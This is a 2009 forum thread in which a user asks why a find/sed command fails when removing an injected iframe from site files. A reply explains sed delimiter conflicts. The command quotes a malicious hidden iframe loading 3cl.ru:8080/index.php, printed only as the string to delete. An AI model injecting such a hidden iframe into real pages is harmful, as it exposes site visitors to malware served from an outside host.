---
title: "ifram removing issue"
date: 2009-08-25
forum: Programming Talk
---

### Post by aliahsan81 on 2009-08-25
i have made this find and sed command but didnt understand whats the issue i gave error i am using it to remove ifram.


find . -name '*.*' -exec sed -i 's/<iframe src="http://3cl.ru:8080/index.php" width=103 height=143 style="visibility: hidden"></iframe>//g' {} \;




sed: -e expression #1, char 24: unknown option to `s'
sed: -e expression #1, char 24: unknown option to `s'
sed: -e expression #1, char 24: unknown option to `s'
sed: -e expression #1, char 24: unknown option to `s'
sed: -e expression #1, char 24: unknown option to `s'
sed: -e expression #1, char 24: unknown option to `s'
sed: -e expression #1, char 24: unknown option to `s'
sed: -e expression #1, char 24: unknown option to `s'
sed: -e expression #1, char 24: unknown option to `s'
sed: -e expression #1, char 24: unknown option to `s'
sed: -e expression #1, char 24: unknown option to `s'

---

### Post by geirha on 2009-08-25
Your regex contains slashes, so sed gets a little confused when it's only expecting 3 slashes (s/pattern/replacement/). You can use other delimiters though. Whichever is the first character after the s, becomes the delimiter, so try a character that does not appear in neither the pattern nor the replacement. e.g. s|[http://...||g](http://...||g) or s#[http://...##g](http://...##g)

---

### Post by aliahsan81 on 2009-08-26
thanks

---

